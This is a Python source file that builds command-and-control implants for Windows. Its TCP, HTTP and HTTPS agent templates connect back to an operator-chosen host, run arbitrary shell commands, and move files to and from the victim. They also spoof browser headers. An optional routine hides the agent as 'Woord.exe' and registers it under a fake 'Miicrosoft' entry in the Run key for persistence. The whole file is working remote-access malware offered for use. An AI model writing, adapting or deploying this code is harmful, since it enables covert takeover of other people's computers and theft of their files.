# templates/tcp_agent_template.py
def tcp_agent_template(lhost, lport, persistence,agent_id):
    if persistence==True:
        val2= """def ensure_persistence():
    destination_executable = os.path.join(os.environ['USERPROFILE'], 'Documents', "Woord.exe")
    try:
        if not os.path.exists(destination_executable):
            shutil.copy(sys.executable, destination_executable)
            key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_SET_VALUE)
            wreg.SetValueEx(key, "Miicrosoft", 0, wreg.REG_SZ, destination_executable)
            wreg.CloseKey(key)
        #print("Persistence ensured.")
    except Exception as e:
        print(f"Error ensuring persistence: {{e}}")"""
        val = "ensure_persistence()"
    else:
        val2= ""
        val = ""
    return f"""import socket
import subprocess
import os
import shutil
import winreg as wreg
import sys
import random
import time

agent_id='{agent_id}'
ip = '{lhost}'
port = {lport}
current_working_directory = os.getcwd()

{val2}

def attempt_connection():
    while True:
        try:
            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cs.connect((ip, port))
            #print("Connected to server.")
            cs.send(agent_id.encode())
            return cs
        except socket.error:
            #print("Connection failed, retrying in a few seconds...")
            time.sleep(random.randint(5, 10))

def change_directory(client_socket, directory):
    global current_working_directory
    try:
        # Debug print to confirm the function is called once
        #print(f"change_directory called with {{directory}}")

        # Determine the new directory path, whether absolute or relative
        new_dir = directory if os.path.isabs(directory) else os.path.join(current_working_directory, directory)
        new_dir = os.path.normpath(new_dir)

        # Check if the new directory is the same as the current to prevent loops
        if new_dir == current_working_directory:
            message = f"Already in {{current_working_directory}}"
            client_socket.send(message.encode())
            #print(message)  # Debug print
            return

        # Change to the new directory if it's different
        os.chdir(new_dir)
        current_working_directory = os.getcwd()

        # Confirm the directory change to the client
        message = f"Changed directory to {{current_working_directory}}"
        client_socket.send(message.encode())
        #print(message)  # Debug print for confirmation
    except Exception as e:
        error_message = f"Error changing directory: {{e}}"
        client_socket.send(error_message.encode())
        #print(error_message)  # Debug print for error


def download_file(client_socket, filename):
    if os.path.isdir(filename):
        client_socket.send(b"Is a directory")
    elif not os.path.exists(filename):
        client_socket.send(b"File does not exist")
    else:
        try:
            file_size = os.path.getsize(filename)
            client_socket.send(str(file_size).encode())
            with open(filename, 'rb') as f:
                while True:
                    chunk = f.read(2048)
                    if not chunk:
                        break
                    client_socket.send(chunk)
        except Exception as e:
            error_message = f"Error sending file: {{str(e)}}"
            client_socket.send(error_message.encode())

def upload_file(client_socket, command_details):
    filename, file_size_str = command_details.split(' ', 1)
    file_size = int(file_size_str)
    if file_size > 0:
        client_socket.send(b"Ready for upload")
        received_size = 0
        with open(filename, 'wb') as f:
            while received_size < file_size:
                chunk = client_socket.recv(2048)
                f.write(chunk)
                received_size += len(chunk)
                if received_size >= file_size:
                    break
        client_socket.send(b"File Upload Successful.")
    else:
        client_socket.send(b"Error: File size is zero or undefined.")

def process_commands(client_socket):
    while True:
        try:
            command = client_socket.recv(2048).decode().strip()
            if not command:
                # No command received; skip this iteration
                continue

            if command == 'quit':
                print("Quitting...")
                client_socket.close()
                break

            # Split the command to get the action and the optional directory
            command_parts = command.split(" ", 1)
            action = command_parts[0]

            if action == 'cd' and len(command_parts) > 1:
                change_directory(client_socket, command_parts[1])
            elif action == 'download' and len(command_parts) > 1:
                download_file(client_socket, command_parts[1])
            elif action == 'upload' and len(command_parts) > 1:
                upload_file(client_socket, command_parts[1])
            else:
                execute_other_commands(client_socket, command_parts)

        except ConnectionResetError:
            #print("Connection closed by server. Reconnecting...")
            client_socket = attempt_connection()
        except Exception as e:
            client_socket.close()
            break  # Exit the loop if an unexpected error occurs



def execute_other_commands(client_socket, msg_parts):
    try:
        p = subprocess.Popen(msg_parts, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = p.communicate()
        msg = output.decode() if output else error.decode()
        client_socket.send(msg.encode())
    except Exception as e:
        client_socket.send(f"Command execution error: {{e}}".encode())

if __name__ == "__main__":
    {val}
    cs = attempt_connection()
    #cs.send(agent_id.encode())
    process_commands(cs)

"""

def http_agent_template(lhost, lport, persistence, userAgent, sleepTimer,agent_id):
    if persistence==True:
        val1=f'''def ensure_persistence():
    try:
        documents_dir = os.path.join(os.environ['USERPROFILE'], 'Documents')
        destination_executable = os.path.join(documents_dir, "client.exe")
        if not os.path.exists(destination_executable):
            shutil.copy(sys.executable, destination_executable)
            key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, wreg.KEY_SET_VALUE)
            wreg.SetValueEx(key, "MyApp", 0, wreg.REG_SZ, destination_executable)
            wreg.CloseKey(key)
    except Exception as e:
        print(f"Error ensuring persistence: {{e}}")'''
        val2="ensure_persistence()"
    else:
        val1=""
        val2=""
    template = f"""import requests
import subprocess
import time
import uuid
import os
import sys
import shutil
import winreg as wreg
import random

headers = {{
    "User-Agent": "{userAgent}",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Referer": "https://www.example.com/"
}}

SERVER_URL = 'http://{lhost}:{lport}'
AGENT_ID = '{agent_id}'
REGISTER_ENDPOINT = f'{{SERVER_URL}}/register'
COMMAND_ENDPOINT = f'{{SERVER_URL}}/get_command'
OUTPUT_ENDPOINT = f'{{SERVER_URL}}/send_output'

global current_working_directory
current_working_directory = os.getcwd()

current_executable = sys.executable
documents_dir = os.path.join(os.environ['USERPROFILE'], 'Documents')
destination_executable = os.path.join(documents_dir, "client.exe")

{val1}

def execute_command(command):
    global current_working_directory
    if command.startswith("download "):
        # This is a command for the agent to upload a file to the server
        filename = command.split(" ", 1)[1]
        return upload_file_to_server(filename)
    elif command.startswith("upload "):
        # This is a command for the agent to download a file from the server
        filename = command.split(" ", 1)[1]
        return download_file_from_server(filename)
    elif command.startswith("cd "):
        directory = command.split(" ", 1)[1]
        try:
            new_dir = os.path.join(current_working_directory, directory)
            os.chdir(new_dir)
            current_working_directory = os.getcwd()  # Update the global variable to new directory
            return f"Changed directory to {{current_working_directory}}"
        except Exception as e:
            return f"Error changing directory: {{e}}"
    else:
        try:
            # Use the updated current working directory for executing commands
            result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True, cwd=current_working_directory)
            return result.stdout or result.stderr or "Executed command successfully."
        except subprocess.CalledProcessError as e:
            return f"Error executing command: {{e.output}}"
        except Exception as e:
            return f"Error: {{e}}"

def upload_file_to_server(filename):
    # Change here to check the file in the current directory instead of DOWNLOAD_DIR
    file_path = filename
    try:
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                files = {{'file': (filename, f)}}
                response = requests.post(OUTPUT_ENDPOINT, files=files, data={{'agent_id': AGENT_ID}}, headers=headers, allow_redirects=True)
                #response = requests.post(OUTPUT_ENDPOINT, files=files, data={{'agent_id': AGENT_ID}}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
            if response.status_code == 200:
                return "File Downloaded successfully."
            else:
                return f"Failed to Download file. Status: {{response.status_code}}, Response: {{response.text}}"
        else:
            return "File does not exist."
    except Exception as e:
        return f"Error: {{e}}"
      
def download_file_from_server(filename):
    # Adjust to the new server endpoint for fetching files
    download_url = f"{{SERVER_URL}}/fetch_file/{{AGENT_ID}}/{{filename}}"
    try:
        response = requests.get(download_url, headers=headers, allow_redirects=True)
        #response = requests.get(download_url, headers=headers, verify=SERVER_CERT, allow_redirects=True)
        if response.status_code == 200:
            file_path = os.path.join(os.getcwd(), filename)  # Save in the current working directory
            with open(file_path, 'wb') as f:
                f.write(response.content)
            return "File Uploaded successfully."
        else:
            return f"Failed to Upload file. Status: {{response.status_code}}, Response: {{response.text}}"
    except Exception as e:
        return f"Error: {{e}}"

def send_output(output,command_to_execute):
    try:
        response = requests.post(OUTPUT_ENDPOINT, data={{'agent_id': AGENT_ID, 'output': output,'command':command_to_execute}}, headers=headers, allow_redirects=True)
        #response = requests.post(OUTPUT_ENDPOINT, data={{'agent_id': AGENT_ID, 'output': output}}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
        print("Response Status:", response.status_code)
        print("Response Text:", response.text)
        if response.ok:
            print("Output sent successfully")
        else:
            print("Failed to send output")
    except requests.exceptions.RequestException as e:
        print(f"Request Error: {{e}}")

def register_agent():
    while True:
        try:
            response = requests.post(REGISTER_ENDPOINT, data={{'agent_id': AGENT_ID}}, headers=headers, allow_redirects=True)
            if response.ok:
                print("Agent registered successfully")
                break  # Break the loop if registration is successful
            else:
                print("Failed to register agent. Retrying...")
                time.sleep({sleepTimer})  # Random sleep between retries
        except requests.exceptions.ConnectionError:
            print("Unable to connect to the server. Retrying in a few seconds...")
            time.sleep({sleepTimer})
        except requests.exceptions.RequestException as e:
            print(f"Network error: {{e}}")
            time.sleep({sleepTimer})

def main():
    {val2}
    register_agent()
    while True:
        try:
            response = requests.get(COMMAND_ENDPOINT, params={{'agent_id': AGENT_ID}}, allow_redirects=True)
            if response.status_code == 200:
                command_to_execute = response.json().get('command', '')
                if command_to_execute:
                    output = execute_command(command_to_execute)
                    send_output(output,command_to_execute)
            time.sleep({sleepTimer})
        except requests.exceptions.ConnectionError:
            print("Unable to connect to the server. Retrying in a few seconds...")
            time.sleep({sleepTimer})
        except requests.exceptions.RequestException as e:
            print(f"Network error: {{e}}")
            time.sleep({sleepTimer})  # Use sleepTimer from the user

if __name__ == "__main__":
    main()
"""
    return template

def https_agent_template(lhost, lport, persistence, userAgent, sleepTimer,agent_id):
    if persistence==True:
        val1=f'''def ensure_persistence():
    try:
        documents_dir = os.path.join(os.environ['USERPROFILE'], 'Documents')
        destination_executable = os.path.join(documents_dir, "client.exe")
        if not os.path.exists(destination_executable):
            shutil.copy(sys.executable, destination_executable)
            key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, wreg.KEY_SET_VALUE)
            wreg.SetValueEx(key, "MyApp", 0, wreg.REG_SZ, destination_executable)
            wreg.CloseKey(key)
    except Exception as e:
        print(f"Error ensuring persistence: {{e}}")'''
        val2="ensure_persistence()"
    else:
        val1=""
        val2=""
    template = f"""import requests
import subprocess
import time
import uuid
import os
import sys
import shutil
import winreg as wreg
import random

headers = {{
    "User-Agent": "{userAgent}",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Referer": "https://www.example.com/"
}}

SERVER_URL = 'https://{lhost}:{lport}'
AGENT_ID = '{agent_id}'
REGISTER_ENDPOINT = f'{{SERVER_URL}}/register'
COMMAND_ENDPOINT = f'{{SERVER_URL}}/get_command'
OUTPUT_ENDPOINT = f'{{SERVER_URL}}/send_output'

global current_working_directory
current_working_directory = os.getcwd()

{val1}

def resource_path(relative_path):
    #Get absolute path to resource, works for dev and for PyInstaller 
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    
    return os.path.join(base_path, relative_path)

SERVER_CERT = resource_path('server.crt')

def execute_command(command):
    global current_working_directory
    if command.startswith("download "):
        # This is a command for the agent to upload a file to the server
        filename = command.split(" ", 1)[1]
        return upload_file_to_server(filename)
    elif command.startswith("upload "):
        # This is a command for the agent to download a file from the server
        filename = command.split(" ", 1)[1]
        return download_file_from_server(filename)
    elif command.startswith("cd "):
        directory = command.split(" ", 1)[1]
        try:
            new_dir = os.path.join(current_working_directory, directory)
            os.chdir(new_dir)
            current_working_directory = os.getcwd()  # Update the global variable to new directory
            return f"Changed directory to {{current_working_directory}}"
        except Exception as e:
            return f"Error changing directory: {{e}}"
    else:
        try:
            # Use the updated current working directory for executing commands
            result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True, cwd=current_working_directory)
            return result.stdout or result.stderr or "Executed command successfully."
        except subprocess.CalledProcessError as e:
            return f"Error executing command: {{e.output}}"
        except Exception as e:
            return f"Error: {{e}}"

def upload_file_to_server(filename):
    # Change here to check the file in the current directory instead of DOWNLOAD_DIR
    file_path = filename
    try:
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                files = {{'file': (filename, f)}}
                response = requests.post(OUTPUT_ENDPOINT, files=files, data={{'agent_id': AGENT_ID}}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
                if response.status_code == 200:
                    return "File Downloaded successfully."
                else:
                    return f"Failed to Download file. Status: {{response.status_code}}, Response: {{response.text}}"
        else:
            return "File does not exist."
    except Exception as e:
        return f"Error: {{e}}"

def download_file_from_server(filename):
    # Adjust to the new server endpoint for fetching files
    download_url = f"{{SERVER_URL}}/fetch_file/{{AGENT_ID}}/{{filename}}"
    try:
        response = requests.get(download_url,verify=SERVER_CERT, headers=headers, allow_redirects=True)
        #response = requests.get(download_url, headers=headers, verify=SERVER_CERT, allow_redirects=True)
        if response.status_code == 200:
            file_path = os.path.join(os.getcwd(), filename)  # Save in the current working directory
            with open(file_path, 'wb') as f:
                f.write(response.content)
            return "File Uploaded successfully."
        else:
            return f"Failed to Upload file. Status: {{response.status_code}}, Response: {{response.text}}"
    except Exception as e:
        return f"Error: {{e}}"

def send_output(output,command_to_execute):
    try:
        response = requests.post(OUTPUT_ENDPOINT, data={{'agent_id': AGENT_ID, 'output': output, 'command':command_to_execute}}, headers=headers, verify=SERVER_CERT, allow_redirects=True)
        #response = requests.post(OUTPUT_ENDPOINT, data={{'agent_id': AGENT_ID, 'output': output}}, verify=SERVER_CERT, allow_redirects=True)
        print("Response Status:", response.status_code)
        print("Response Text:", response.text)
        if response.ok:
            print("Output sent successfully")
        else:
            print("Failed to send output")
    except requests.exceptions.RequestException as e:
        print(f"Request Error: {{e}}")

def register_agent():
    while True:
        try:
            response = requests.post(REGISTER_ENDPOINT, data={{'agent_id': AGENT_ID}},verify=SERVER_CERT, headers=headers, allow_redirects=True)
            if response.ok:
                print("Agent registered successfully")
                break  # Break the loop if registration is successful
            else:
                print("Failed to register agent. Retrying...")
                time.sleep({sleepTimer})  # Random sleep between retries
        except requests.exceptions.ConnectionError:
            print("Unable to connect to the server. Retrying in a few seconds...")
            time.sleep({sleepTimer})
        except requests.exceptions.RequestException as e:
            print(f"Network error: {{e}}")
            time.sleep({sleepTimer})

def main():
    {val2}    
    register_agent()
    while True:
        try:
            response = requests.get(COMMAND_ENDPOINT, params={{'agent_id': AGENT_ID}}, verify=SERVER_CERT, allow_redirects=True)
            if response.status_code == 200:
                command_to_execute = response.json().get('command', '')
                if command_to_execute:
                    output = execute_command(command_to_execute)
                    send_output(output,command_to_execute)
            time.sleep({sleepTimer})  # Random sleep between retries
        except requests.exceptions.ConnectionError:
            print("Unable to connect to the server. Retrying in a few seconds...")
            time.sleep({sleepTimer})  # Random sleep between 5 to 10 seconds
        except requests.exceptions.RequestException as e:
            print(f"Network error: {{e}}")
            time.sleep({sleepTimer})  # Use sleepTimer from the user

if __name__ == "__main__":
    main()
"""
    return template
